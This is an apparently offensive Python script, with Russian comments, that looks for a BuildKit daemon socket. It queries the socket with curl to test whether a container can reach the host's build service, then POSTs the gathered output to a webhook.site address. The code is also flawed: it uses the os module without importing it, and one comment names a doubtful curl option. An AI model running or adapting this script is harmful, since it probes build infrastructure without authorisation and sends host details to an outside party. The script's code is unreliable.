import socket
import subprocess

WEBHOOK_URL = "https://webhook.site/e497c7bf-1edd-41d4-ba35-a5f6311a07a8"
SOCKET_PATH = "/run/buildkit/buildkitd.sock"

def attack_buildkit():
    report = []
    
    # 1. Проверяем доступность сокета
    if os.path.exists(SOCKET_PATH):
        report.append(f"[+] BuildKit socket found at {SOCKET_PATH}")
    else:
        return "[-] Socket not found. Termination."

    # 2. Попытка получить версию/инфо через curl (GRPC поверх Unix Socket)
    # BuildKit использует gRPC, поэтому обычный HTTP GET вернет ошибку, 
    # но сам факт ответа подтвердит, что мы можем "общаться" с хостом.
    try:
        # Пробуем отправить пустой запрос, чтобы спровоцировать ответ демона
        cmd = f"curl --unix-socket {SOCKET_PATH} http://localhost/version"
        output = subprocess.getoutput(cmd)
        report.append(f"[*] Raw response from buildkitd:\n{output}")
    except Exception as e:
        report.append(f"[-] Communication failed: {e}")

    # 3. Попытка перехвата через gRPC (если есть возможность)
    # На Senior-уровне мы понимаем, что нам нужен gRPC-клиент, но даже curl --abstract-unit
    # может показать, закрыто ли соединение или нам разрешен коннект.
    
    return "\n".join(report)

if __name__ == "__main__":
    result = attack_buildkit()
    subprocess.run(['curl', '-s', '-X', 'POST', '-d', result, WEBHOOK_URL])
